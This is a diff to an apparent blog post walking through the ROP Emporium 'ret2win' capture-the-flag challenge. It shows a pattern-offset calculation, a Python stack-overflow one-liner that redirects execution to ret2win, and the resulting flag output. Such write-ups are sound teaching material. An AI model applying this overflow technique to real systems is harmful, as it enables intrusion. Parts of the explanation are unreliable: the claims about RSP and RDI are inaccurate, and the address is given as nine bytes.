@@ -122,3 +122,28 @@ Legend: code, data, rodata, value
 Stopped reason: SIGSEGV                                                                                   
 0x0000000000400810 in pwnme ()   
 {% endhighlight %}
+We can see that the stack pointer(RSP) has now been overwritten by the value "AA0AAFAAb"*.  Using this value, we can determine how much padding will be needed before writting the address to the fonction ret2win@0x00400811
+{% highlight bash%}
+pattern offset AA0AAFAAb
+AA0AAFAAb found at offset: 40
+{% endhighlight %}
+Now if all goes according to plan, the follow line should return the flags:
+{% highlight bash%}
+python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
+python -c 'print "\x90"*40                #Will take care of the padding
++"\x11\x08\x40\x00\x00\x00\x00\x00\x00"'  #Will write our address into RSP
+   
+root@kali:~/ropemporium# python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
+ret2win by ROP Emporium
+64bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
+Segmentation fault
+
+{% endhighlight %}
+   
+*Note that the value of RIP has not been overwritten, this is because in the x64 architecture, the value will not be poped into RDI if it cannot be jumped to or executed.
